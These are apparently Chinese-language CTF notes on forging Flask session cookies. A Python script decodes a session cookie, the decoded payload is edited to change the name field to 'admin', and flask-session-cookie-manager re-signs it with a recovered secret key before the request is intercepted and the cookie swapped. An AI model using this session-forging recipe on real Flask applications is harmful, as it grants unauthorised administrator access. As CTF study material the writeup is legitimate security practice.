<https://www.cnblogs.com/chrysanthemum/p/11722351.html>
<https://www.cnblogs.com/murkuo/p/15174413.html>
先获取session的解密原session。
python ctf/flask_decode.py   .eJw9kE-xxx
```
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```
修改里面的载体，如user改admin。
```
{'_fresh': True, '_id': b'5016bfd6a1eef38b37a3b1c03b7f1e74732a70b3abc44761d5d15d0f6574dc821644
655dce770b636ffcc53630c04aa2e6daab6dc4db050ec87d4c17ce98312e', 'csrf_token': b'adc491f7ab2338c
3c8ab97ac918bb6149a539c74', 'image': b'8P3o', 'name': 'admin', 'user_id': '10'}
```

再加密：
使用密钥+载体字符生成新session脚本：
<https://github.com/noraj/flask-session-cookie-manager>

```
python flask_session_cookie_manager3.py encode -s '密钥' -t '载体'

python flask_session_cookie_manager3.py encode -s "ckj123" -t  "{'_fresh': True, '_id': b'5016bfd6a1eef38b37a3b1c03b7f1e74732a70b3abc44761d5d15d0f6574dc821644
655dce770b636ffcc53630c04aa2e6daab6dc4db050ec87d4c17ce98312e', 'csrf_token': b'adc491f7ab2338c
3c8ab97ac918bb6149a539c74', 'image': b'8P3o', 'name': 'admin', 'user_id': '10'}"
```


最后抓包替换即可。